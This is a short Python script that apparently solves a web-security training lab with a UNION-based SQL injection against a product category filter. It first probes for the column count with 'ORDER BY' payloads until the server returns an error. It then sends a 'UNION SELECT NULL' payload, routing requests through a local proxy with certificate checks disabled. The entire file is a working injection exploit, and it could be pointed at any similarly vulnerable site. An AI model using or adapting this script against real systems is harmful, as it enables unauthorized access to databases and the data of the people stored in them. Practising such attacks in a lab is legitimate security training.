import urllib3
import sys
import requests
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def Number_of_cols(url:str):
    url = url + '/filter?category=Gifts'
    # The application uses this sql query to filter by category: SELECT * FROM products WHERE category = ''
    # Determining the number of columns so it help us in exploiting the sqli with union statement
    payload = "'ORDER BY "
    for i in range(1, 20):
        try:
            r = requests.get(url + payload + f"{i}--")
            if r.status_code == 500:
                return i - 1
        except requests.exceptions.RequestException as ex:
            print(f"Error: {ex}")
            return None
    return None

def exploit(url:str, cols:int):
    num_of_nulls = cols * "NULL,"
    url = url + '/filter?category=Gifts' + f"'UNION SELECT {num_of_nulls}".removesuffix(',') + "--"
    try:
        r = requests.get(url, proxies=proxies, verify=False)
        if "NULL" in r.text:
            return True
        else:
            print("Failed to exploit")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')

    cols = Number_of_cols(url)
    if cols:
        print(f"Num of cols: {cols}")
    else:
        print("Failed to determin num of cols")
        sys.exit(-1)
    
    if exploit(url, cols):
        print("Lab Solved!")
        sys.exit(0)
    else:
        sys.exit(-1)

if __name__ == '__main__':
    main()